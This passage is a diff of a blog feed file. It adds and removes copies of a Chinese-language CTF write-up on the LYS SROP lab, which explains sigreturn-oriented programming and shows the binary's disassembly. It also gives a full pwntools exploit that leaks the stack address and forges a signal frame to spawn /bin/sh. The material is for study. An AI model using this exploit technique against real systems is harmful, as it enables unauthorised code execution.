+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~/pwn/srop# objdump -d -M intel srop</span><br><span class="line"></span><br><span class="line">srop:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;.text&gt;:</span><br><span class="line">  401000:       48 31 c0                xor    rax,rax</span><br><span class="line">  401003:       ba 00 04 00 00          mov    edx,0x400</span><br><span class="line">  401008:       48 89 e6                mov    rsi,rsp</span><br><span class="line">  40100b:       48 89 c7                mov    rdi,rax</span><br><span class="line">  40100e:       0f 05                   syscall </span><br><span class="line">  401010:       c3                      ret    </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/srop-syscall2.png"
+                      alt="image"
+                ></p>
+<blockquote>
+<p>依照syscall表知道<code>*buf</code>指向 <code>rsp</code></p>
+</blockquote>
+<h2 id="set-rax"><a href="#set-rax" class="headerlink" title="set rax"></a>set rax</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/srop-setrax.png"
+                      alt="image"
+                ></p>
+<p>透過蓋回<code>x/03</code>設定 <code>rax</code> 成1，後就可以write出rsp的內容，總共 0x400</p>
+<h3 id="stack-frame"><a href="#stack-frame" class="headerlink" title="stack frame"></a>stack frame</h3><p>最後照 lys 簡報填上，<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/srop_frame.png"
+                      alt="Alt text"
+                ></p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><blockquote>
+<p>遠端關了，本地要開tmux</p>
+</blockquote>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./srop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 輸入會填進rsi</span></span><br><span class="line"></span><br><span class="line">p = flat(<span class="number">0x401000</span>,<span class="number">0x401003</span>,<span class="number">0x401000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendline(p)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;\x03&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.recv(<span class="number">0x240</span>)</span><br><span class="line"></span><br><span class="line">rsp = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x281</span></span><br><span class="line">success(<span class="string">&quot;rsp -&gt; %s&quot;</span>, <span class="built_in">hex</span>(rsp)) </span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="number">0x401000</span>,<span class="number">0x40100e</span>,</span><br><span class="line">    [<span class="number">0</span>]*<span class="number">13</span>,</span><br><span class="line">    rsp+<span class="number">272</span>, <span class="comment"># rdi -&gt; &#x27;/bin/sh&#x27;</span></span><br><span class="line">    [<span class="number">0</span>]*<span class="number">4</span>,  <span class="comment"># rsi,rbp,rbx,rdx</span></span><br><span class="line">    <span class="number">0x3b</span>,   <span class="comment"># rax</span></span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x40100e</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x33</span>,</span><br><span class="line">    [<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(p2))</span><br><span class="line">p2 += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">r.send(p2)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">r.send(p2[<span class="number">8</span>:][:<span class="number">15</span>])</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h3><p><a class="link"   href="https://kazma.tw/2024/08/05/LYS-Rop-lab-srop-Writeup/" >kazma.tw LYS-Rop-lab-srop-Writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://oalieno.tw/2019/09/18/srop/" >oalieno.tw srop<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NTTU 伺服器原理 WriteUp</title>
     <url>/2024/08/06/server/</url>
     <content><![CDATA[<ol>
@@ -2336,72 +2536,6 @@ Pwnable.tw</p>
       <tags>
         <tag>csie</tag>
         <tag>server</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LYS SROP lab WriteUp</title>
-    <url>/2024/08/20/srop-WriteUp/</url>
-    <content><![CDATA[<blockquote>
-<p>srop (signal return oriented program)</p>
-</blockquote>
-<h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>當接收到一個sinal信號</p>
-<ol>
-<li><p>kernel 會把上下文 ( 各種暫存器 ) 保留到 stack 上，叫做 Signal Frame</p>
-</li>
-<li><p>kernal 將進程的控制流轉移到用戶定義的信號處理程序（signal handler）。這個處理程序是<strong>用戶程式</strong>中指定的一段代碼，用來處理特定的信號。</p>
-</li>
-<li><p>信號處理程序執行用戶定義的操作，如打印消息、清理資源、或者修改某些全局狀態 and ret。</p>
-</li>
-<li><p>當信號處理程序結束後，控制流會跳轉到一個名為 <code>__restore_rt</code> 的函數。這個函數內部會執行一個特定的系統調用指令：</p>
- <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax, 0xf  ; 將系統調用號 0xf (sys_rt_sigreturn) 放入 RAX 寄存器</span><br><span class="line">syscall       ; 呼叫系統調用，進入內核模式</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p>上面這個function會call <code>sys_rt_sigreturn</code> 從stack中提取出之前保存的 Signal Frame，並恢復上下文，包括所有暫存器的值。 process 將繼續從原來中斷的位置執行。</p>
-</li>
-</ol>
-<h2 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h2><p>rop 需要設定每一個rigister的值<br>這時候在 stack 上擺好 Signal Frame，然後呼叫 sys_rt_sigreturn syscall，利用srop就可以一次設定好全部的rigster</p>
-<p>優點：效率高，簡化rop chain<br>缺點：需要較大的stack空間</p>
-<h3 id="rt-sigreturn"><a href="#rt-sigreturn" class="headerlink" title="rt_sigreturn"></a><code>rt_sigreturn</code></h3><p>一樣用前面xor的手法把rax設定成 0xf， <code>mov rax, 0xf; syscall</code> ，他就會 call 到 <code>rt_sigreturn</code></p>
-<blockquote>
-<p>find 0xf in <a class="link"   href="https://x64.syscall.sh/" >syscall<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-</blockquote>
-<h2 id="LYS-lab-srop"><a href="#LYS-lab-srop" class="headerlink" title="LYS lab_srop"></a>LYS lab_srop</h2><p>基本原理：在Linux中，信號處理過程中使用了一個名為sigreturn的系統調用，它會從堆疊中恢復寄存器的狀態。當一個信號處理程序結束時，系統會自動調用 sigreturn 來恢復程式的執行狀態。</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~/pwn/srop# objdump -d -M intel srop</span><br><span class="line"></span><br><span class="line">srop:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;.text&gt;:</span><br><span class="line">  401000:       48 31 c0                xor    rax,rax</span><br><span class="line">  401003:       ba 00 04 00 00          mov    edx,0x400</span><br><span class="line">  401008:       48 89 e6                mov    rsi,rsp</span><br><span class="line">  40100b:       48 89 c7                mov    rdi,rax</span><br><span class="line">  40100e:       0f 05                   syscall </span><br><span class="line">  401010:       c3                      ret    </span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/srop-syscall2.png"
-                      alt="image"
-                ></p>
-<blockquote>
-<p>依照syscall表知道<code>*buf</code>指向 <code>rsp</code></p>
-</blockquote>
-<h2 id="set-rax"><a href="#set-rax" class="headerlink" title="set rax"></a>set rax</h2><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/srop-setrax.png"
-                      alt="image"
-                ></p>
-<p>透過蓋回<code>x/03</code>設定 <code>rax</code> 成1，後就可以write出rsp的內容，總共 0x400</p>
-<h3 id="stack-frame"><a href="#stack-frame" class="headerlink" title="stack frame"></a>stack frame</h3><p>最後照 lys 簡報填上，<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/srop_frame.png"
-                      alt="Alt text"
-                ></p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><blockquote>
-<p>遠端關了，本地要開tmux</p>
-</blockquote>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./srop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 輸入會填進rsi</span></span><br><span class="line"></span><br><span class="line">p = flat(<span class="number">0x401000</span>,<span class="number">0x401003</span>,<span class="number">0x401000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendline(p)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;\x03&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.recv(<span class="number">0x240</span>)</span><br><span class="line"></span><br><span class="line">rsp = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x281</span></span><br><span class="line">success(<span class="string">&quot;rsp -&gt; %s&quot;</span>, <span class="built_in">hex</span>(rsp)) </span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="number">0x401000</span>,<span class="number">0x40100e</span>,</span><br><span class="line">    [<span class="number">0</span>]*<span class="number">13</span>,</span><br><span class="line">    rsp+<span class="number">272</span>, <span class="comment"># rdi -&gt; &#x27;/bin/sh&#x27;</span></span><br><span class="line">    [<span class="number">0</span>]*<span class="number">4</span>,  <span class="comment"># rsi,rbp,rbx,rdx</span></span><br><span class="line">    <span class="number">0x3b</span>,   <span class="comment"># rax</span></span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x40100e</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x33</span>,</span><br><span class="line">    [<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(p2))</span><br><span class="line">p2 += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">r.send(p2)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">r.send(p2[<span class="number">8</span>:][:<span class="number">15</span>])</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h3><p><a class="link"   href="https://kazma.tw/2024/08/05/LYS-Rop-lab-srop-Writeup/" >kazma.tw LYS-Rop-lab-srop-Writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://oalieno.tw/2019/09/18/srop/" >oalieno.tw srop<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
